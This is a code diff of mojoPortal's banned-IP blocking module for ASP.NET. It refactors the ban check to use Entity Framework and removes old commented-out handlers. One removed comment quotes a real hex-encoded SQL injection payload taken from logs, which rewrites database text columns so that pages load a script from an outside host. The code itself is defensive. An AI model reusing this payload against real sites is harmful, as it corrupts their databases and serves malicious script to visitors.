@@ -36,213 +36,135 @@
 // 2008-01-05 added try catch to prevent error before upgrade creates the table
 // 2008-08-15 added ViewStateIsHacked funtion and additional true criteria
 
-using System;
-using System.Data.Common;
-using System.IO;
-using System.Web;
 using log4net;
 using mojoPortal.Business;
-using mojoPortal.Business.WebHelpers;
+using mojoPortal.Core.EF;
+using mojoPortal.Data.EF;
 using mojoPortal.Web.Framework;
+using System;
+using System.Data.Common;
+using System.Web;
 
 namespace mojoPortal.Web
 {
-    /// <summary>
-    ///
-    /// </summary>
-    public class BannedIPBlockingHttpModule : IHttpModule
-    {
-        private static readonly ILog log = LogManager.GetLogger(typeof(BannedIPBlockingHttpModule));
+	public class BannedIPBlockingHttpModule : IHttpModule
+	{
+		private static readonly ILog log = LogManager.GetLogger(typeof(BannedIPBlockingHttpModule));
+		private readonly IUnitOfWork unitOfWork;
 
 
-        public void Init(HttpApplication application)
-        {
-            application.BeginRequest += new EventHandler(BeginRequest);
-            application.EndRequest += new EventHandler(this.EndRequest);
-        }
-
-        
-        private void BeginRequest(object sender, EventArgs e)
-        {
-            if (WebConfigSettings.DisableBannedIpBlockingModule) { return; }
-
-            HttpApplication app = ((HttpApplication)sender);
-
-            if (WebUtils.IsRequestForStaticFile(app.Request.Path)) { return; }
+		public BannedIPBlockingHttpModule()
+		{
+			// TODO: Replace with Dependancy Injection
+			unitOfWork = new UnitOfWork(new mojoPortalDbContext());
+		}
 
 
-            HttpContext context = app.Context;
-            string ip = SiteUtils.GetIP4Address();
-
-            try
-            {
-                if (!IsBanned(ip)) return;
-
-                AbortRequestFromBannedIP(context);
-            }
-            catch (DbException ex)
-            {
-                log.Error("handled exception: ", ex);
-            }
-            catch (InvalidOperationException ex)
-            {
-                log.Error("handled exception: ", ex);
-            }
-            catch (Exception ex)
-            {
-                // hate to trap System.Exception but SqlCeException doe snot inherit from DbException as it should
-                if (DatabaseHelper.DBPlatform() != "SqlCe") { throw; }
-                log.Error(ex);
-            }
-        }
-
-       
-        //private void Error(object sender, EventArgs e)
-        //{
-        //    // don't throw an error in our error handler
-        //    try
-        //    {
-        //        HttpApplication app = (HttpApplication)sender;
-        //        HttpContext context = app.Context;
-
-        //        Exception rawException = context.Server.GetLastError();
-        //        if (rawException != null)
-        //        {
-        //            if (
-        //                (rawException is PathTooLongException)
-        //                || ((rawException.InnerException != null) && (rawException.InnerException is PathTooLongException))
-        //                )
-        //            {
-        //                // hacking attempts
-        //                /* example seen in logs
-        //                 * /download.aspx?skin=printerfriendly;DeCLARE%20@S%20CHAR(4000);SET%20@S=CAST(0x4445434C415245204054207661726368617228323535292C40432076617263686172283430303029204445434C415245205461626C655F437572736F7220435552534F5220464F522073656C65637420612E6E616D652C622E6E616D652066726F6D207379736F626A6563747320612C737973636F6C756D6E73206220776865726520612E69643D622E696420616E6420612E78747970653D27752720616E642028622E78747970653D3939206F7220622E78747970653D3335206F7220622E78747970653D323331206F7220622E78747970653D31363729204F50454E205461626C655F437572736F72204645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C4043205748494C4528404046455443485F5354415455533D302920424547494E20657865632827757064617465205B272B40542B275D20736574205B272B40432B275D3D5B272B40432B275D2B2727223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777332E3830306D672E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272720776865726520272B40432B27206E6F74206C696B6520272725223E3C2F7469746C653E3C736372697074207372633D22687474703A2F2F777777332E3830306D672E636E2F63737273732F772E6A73223E3C2F7363726970743E3C212D2D272727294645544348204E4558542046524F4D20205461626C655F437572736F7220494E544F2040542C404320454E4420434C4F5345205461626C655F437572736F72204445414C4C4F43415445205461626C655F437572736F72%20AS%20CHAR(4000));ExEC(@S);
-        //                 */
-        //                app.Context.Server.ClearError();
-
-        //                /* Blacklist em */
-        //                AddIPToBanList(context, "PathTooLongException");
-        //                AbortRequestFromBannedIP(context);
-        //                return;
-
-        //            }
-                    
-                   
-        //        }
+		public void Init(HttpApplication application)
+		{
+			application.BeginRequest += new EventHandler(BeginRequest);
+			application.EndRequest += new EventHandler(this.EndRequest);
+		}
 
 
-                
-        //        //string viewState = context.Request.Form["__VIEWSTATE"];
+		private void BeginRequest(object sender, EventArgs e)
+		{
+			if (WebConfigSettings.DisableBannedIpBlockingModule)
+			{
+				return;
+			}
 
-        //        //if (viewState == null || viewState.Length == 0)
-        //        //    return;
+			HttpApplication app = (HttpApplication)sender;
 
-        //        //if (ViewStateIsHacked(viewState))
-        //        //{
-        //        //    app.Context.Server.ClearError();
+			if (WebUtils.IsRequestForStaticFile(app.Request.Path)) 
+			{
+				return;
+			}
 
-        //        //    /* Blacklist em */
-        //        //    AddIPToBanList(context, "detected viewstate manipulation");
-        //        //    AbortRequestFromBannedIP(context);
-        //        //}
-        //    }
-        //    catch (Exception ex)
-        //    {
-        //        log.Error("handled exception: ", ex);
-        //    }
-        //}
+			HttpContext context = app.Context;
 
-        //private bool ViewStateIsHacked(string viewState)
-        //{
-        //    /* There are numerous ways to screw up view state, but it should always be Base64-encoded. 
-        //           Spammers try to plug emails into view state in plain text, and we can look for '@' since
-        //           it's not allowed in Base64. It's a smoke test, but it should serve its purpose well.
-               
-        //           We'll try to extract view state from the Form collection and see what we're dealing with.
-        //           The exception we receive here is too generic to tell.
-        //        */
+			string ip = SiteUtils.GetIP4Address();
 
-        //    if (HttpUtility.HtmlDecode(viewState).IndexOf('@') > -1)
-        //    {
-        //        return true;
-        //    }
+			try
+			{
+				if (!IsBanned(ip))
+				{
+					return;
+				}
 
-        //    // I see this all the time in my logs always the browser is Opera
-        //    if (viewState == "/wEWBwLs aoIAvub76kOAqDii7cIAoHH I8IAobm wECyqTuxgIChJ/kwgI=")
-        //    {
-        //        return true;
-        //    }
+				AbortRequestFromBannedIP(context);
+			}
+			catch (DbException ex)
+			{
+				log.Error("handled exception: ", ex);
+			}
+			catch (InvalidOperationException ex)
+			{
+				log.Error("handled exception: ", ex);
+			}
+			catch (Exception ex)
+			{
+				// hate to trap System.Exception but SqlCeException doe snot inherit from DbException as it should
+				if (DatabaseHelper.DBPlatform() != "SqlCe")
+				{
+					throw;
+				}
 
-        //    if (viewState == "/wEWBwKo/aC9BgL7m  pDgKg4ou3CAKBx/iPCAKG5vsBAsqk7sYCAoSf5MIC")
-        //    {
-        //        return true;
-        //    }
-
-        //    return false;
-        //}
-
-        
-        private void EndRequest(object sender, EventArgs e)
-        {
-            HttpApplication app = (HttpApplication)sender;
-            HttpContext context = app.Context;
-            HttpResponse response = context.Response;
+				log.Error(ex);
+			}
+		}
 
 
-            if (!context.Items.Contains("BanCurrentRequest"))
-                return;
+		private void EndRequest(object sender, EventArgs e)
+		{
+			HttpApplication app = (HttpApplication)sender;
+			HttpContext context = app.Context;
+			HttpResponse response = context.Response;
 
-            response.ClearContent();
-            response.SuppressContent = true;
-            response.StatusCode = 403;
-            response.StatusDescription = "Access denied: your IP has been banned due to spamming or hacking attempts.";
-        }
+			if (!context.Items.Contains("BanCurrentRequest"))
+			{
+				return;
+			}
 
-        
-        //private void AddIPToBanList(HttpContext context, string reason)
-        //{
-        //    string ip = SiteUtils.GetIP4Address();
+			response.ClearContent();
+			response.SuppressContent = true;
+			response.StatusCode = 403;
+			response.StatusDescription = "Access denied: your IP has been banned due to spamming or hacking attempts.";
+		}
 
-        //    if (IsBanned(ip)) return; //already banned
 
-        //    BannedIPAddress ipToBan = new BannedIPAddress();
-        //    ipToBan.BannedIP = ip;
-        //    ipToBan.BannedUtc = DateTime.UtcNow;
-        //    ipToBan.BannedReason = reason;
-        //    ipToBan.Save();
+		private static void AbortRequestFromBannedIP(HttpContext context)
+		{
+			context.Items["BanCurrentRequest"] = true;
+			context.ApplicationInstance.CompleteRequest();
 
-        //    String pathToCacheDependencyFile
-        //            = HttpContext.Current.Server.MapPath(
-        //        "~/Data/bannedipcachedependency.config");
-        //    CacheHelper.TouchCacheFile(pathToCacheDependencyFile);
+			if (WebConfigSettings.LogBlockedRequests)
+			{
+				log.Info("BannedIPBlockingHttpModule blocked request from banned ip address " + SiteUtils.GetIP4Address());
+			}
+		}
 
-        //    log.Info("BannedIPBlockingHttpModule banned ip address " + ip + " for reason: " + reason);
-        //}
 
-        
-        private static void AbortRequestFromBannedIP(HttpContext context)
-        {
-            context.Items["BanCurrentRequest"] = true;
-            context.ApplicationInstance.CompleteRequest();
-            if (WebConfigSettings.LogBlockedRequests)
-            {
-                log.Info("BannedIPBlockingHttpModule blocked request from banned ip address " + SiteUtils.GetIP4Address());
-            }
-        }
+		private bool IsBanned(string ipAddress)
+		{
+			// 2008-08-13 this list got too large over time
+			// better to make a small hit to the db on each request than to cache this huge List
 
-        private bool IsBanned(string ip)
-        {
-            // 2008-08-13 this list got too large over time
-            // better to make a small hit to the db on each request than to cache this huge List
+			//List<String> bannedIPs = CacheHelper.GetBannedIPList();
+			//if(bannedIPs.Contains(ip))return true;
+			//return false;
 
-            //List<String> bannedIPs = CacheHelper.GetBannedIPList();
-            //if(bannedIPs.Contains(ip))return true;
-            //return false;
+			// Replace old business logic with EF Repository
+			//return BannedIPAddress.IsBanned(ip);
 
-            return BannedIPAddress.IsBanned(ip);
+			var isBanned = unitOfWork.BannedIPAddresses.IsBanned(ipAddress);
 
-        }
+			unitOfWork.Complete();
 
-        
-        public void Dispose() { }
-    }
+			return isBanned;
+		}
+
+
+		public void Dispose() { }
+	}
 }
